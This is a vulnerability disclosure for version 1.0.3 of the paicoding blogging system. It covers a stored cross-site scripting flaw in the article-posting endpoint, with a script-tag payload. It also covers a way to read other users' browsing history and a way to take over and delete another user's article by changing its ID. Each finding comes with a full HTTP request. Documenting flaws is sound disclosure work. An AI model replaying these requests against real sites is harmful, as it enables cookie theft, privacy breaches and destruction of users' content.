BUG_Author

Longlong Gong

# Project

Address: [paicoding](https://gitee.com/itwanger/paicoding)

## 1、Stored cross-site scripting

###  1.1、`/article/api/post` Stored cross-site scripting

[Affected version]

v1.0.3



[Affected Component]

/article/api/post



[Software]

https://gitee.com/itwanger/paicoding/repository/archive/1.0.3-%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98



[Description]

There is an XSS vulnerability in paicoding system v1.0.3, which is caused by publishing articles on the "/article/app/post" interface. The content parameter is not processed correctly. Hackers can exploit this vulnerability to obtain cookies, conduct phishing attacks, and worm attacks.

POC

```
POST /article/api/post HTTP/1.1
Host: 192.168.1.184:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 358
Origin: http://192.168.1.184:8080
Connection: keep-alive
Referer: http://192.168.1.184:8080/article/edit?articleId=2510310133438468
Cookie: Hm_lvt_adedae9bc250561cc17e96dc1fb46079=1742018910; f-device=5da7cc3f-4ad0-4f89-bc0e-8dc33f3058a1; Hm_lvt_2745ad927051c4bc7b7ee34b781df793=1744508666,1744512202; JSESSIONID=7622FB52EA92D46D73EB16E1C8FDAB75; Hm_lpvt_2745ad927051c4bc7b7ee34b781df793=1744513630; HMACCOUNT=64730FFDD08089EE; f-session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJwYWlfY29kaW5nIiwiZXhwIjoxNzQ3MTA1MzcxLCJzIjoiYzBhODAxYjguMTc0NDUxMzM3MTk0OS4xNDg1NjE0ODkiLCJ1IjoxfQ.MXOWX7ZNSyV0UEyiXR5oInCP1TuaqYfPsgdUOnwgi1Q
Priority: u=0

{"articleId":"2510310133438468","articleType":"BLOG","source":2,"sourceUrl":"","cover":"","title":"123456","content":"<script>alert(123456)</script>\n1234567890\n1234567890\n1234567890\n1234567890\n1234567890\n1234567890\n1234567890\n1234567890\n1234567890\n1234567890","categoryId":"6","readType":"0","tagIds":["136"],"summary":"123456","actionType":"post"}
```

Administrators do not need to review articles published by them, while regular users do. For the sake of convenience, we will use administrators to publish articles

![image-20250413110441550](assets/image-20250413110441550.png)

Insert XSS payload into the content

![image-20250413110506194](assets/image-20250413110506194.png)

![image-20250413110527939](assets/image-20250413110527939.png)

Others can discover XSS issues upon entering the article

![image-20250413110805260](assets/image-20250413110805260.png)

![image-20250413110817590](assets/image-20250413110817590.png)

## 2、Logical loopholes

###  2.1、`/user/home?userId=1&homeSelectType=read` View browsing history of others

[Affected version]

v1.0.3



[Affected Component]

/user/home?userId=1&homeSelectType=read



[Software]

https://gitee.com/itwanger/paicoding/repository/archive/1.0.3-%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98



[Description]

In Paicoding system v1.0.3, by accessing the "/user/home?userId=1&homeSelectType=read" interface, it is possible to directly read the browsing history of other users, which is not visible in the design and has logical vulnerabilities, posing a threat to user privacy

POC

```
GET /user/home?userId=1&homeSelectType=read HTTP/1.1
Host: 192.168.1.184:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: Hm_lvt_adedae9bc250561cc17e96dc1fb46079=1742018910; f-device=5da7cc3f-4ad0-4f89-bc0e-8dc33f3058a1; Hm_lvt_2745ad927051c4bc7b7ee34b781df793=1744508666,1744512202; JSESSIONID=6EC72A17247670A0E9EE681BD6373322; Hm_lpvt_2745ad927051c4bc7b7ee34b781df793=1744515272; HMACCOUNT=64730FFDD08089EE; f-session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJwYWlfY29kaW5nIiwiZXhwIjoxNzQ3MTA3MTY1LCJzIjoiYzBhODAxYjguMTc0NDUxNTE2NTIwMS4xNDg1NjE2MjAiLCJ1IjozfQ.YvbQ2_IPtHyoZSOL_DKwjo05gFHeNlwvZ2MEv8dZRYI
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```

By accessing the URL "http://localhost:8080/user/home?userId=1&homeSelectType=read", you can see the browsing history of the administrator. Through the article, you can see the publisher. After viewing the publisher, you can directly modify homeSelectType=read

![image-20250413114116150](assets/image-20250413114116150.png)

###  2.2、`/article/api/post` Horizontal overstepping of authority

[Affected version]

v1.0.3



[Affected Component]

/article/api/post



[Software]

https://gitee.com/itwanger/paicoding/repository/archive/1.0.3-%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98



[Description]

In Paicoding system v1.0.3, by modifying the interface of one's own article and changing the article ID to someone else's, it is possible to move someone else's article to one's own management, and at the same time, someone else's article will be deleted. Hackers can exploit this vulnerability to delete someone else's article

POC

```
POST /article/api/post HTTP/1.1
Host: 192.168.1.184:8080
Content-Length: 772
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/json
Origin: http://192.168.1.184:8080
Referer: http://192.168.1.184:8080/article/edit?articleId=2510310133438471
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_adedae9bc250561cc17e96dc1fb46079=1741931237,1741948074,1742043334; f-device=02392297-39f9-40e4-a77e-66bb97a6bfdb; Hm_lvt_2745ad927051c4bc7b7ee34b781df793=1744506741; HMACCOUNT=A206C719C9C02C2F; f-session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJwYWlfY29kaW5nIiwiZXhwIjoxNzQ3MTAwMTc3LCJzIjoiYzBhODAxYjguMTc0NDUwODE3NzY2My4xNDg1NjEwMTYiLCJ1IjoyfQ.Wo3spHlARqQgJ6dDIlivIZGM87RE1c_dTJbivTr34JI; JSESSIONID=4358DD4BEBCD4C63A907ED6F4F1598D7; Hm_lpvt_2745ad927051c4bc7b7ee34b781df793=1744516778
Connection: keep-alive

{"articleId":"2510310133438472","articleType":"BLOG","source":2,"sourceUrl":"","cover":"","title":"123456","content":"123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456123456","categoryId":"6","readType":"0","tagIds":["136"],"summary":"123456","actionType":"post"}
```

A regular user account is account A. First, create an article

![image-20250413115713454](assets/image-20250413115713454.png)

Then account B, the administrator, will create another article

![image-20250413115913043](assets/image-20250413115913043.png)

Account A edits their own article

![image-20250413115933697](assets/image-20250413115933697.png)

Publish packet capture or send it to the repeater module

![image-20250413115953751](assets/image-20250413115953751.png)

We see that the article on account B is still there now

![image-20250413120037809](assets/image-20250413120037809.png)

Account A modifies the article ID to account B and sends the package

![image-20250413120126705](assets/image-20250413120126705.png)

We see that User A has 2 articles

![image-20250413120141338](assets/image-20250413120141338.png)

The article on account B has disappeared

![image-20250413120155920](assets/image-20250413120155920.png)
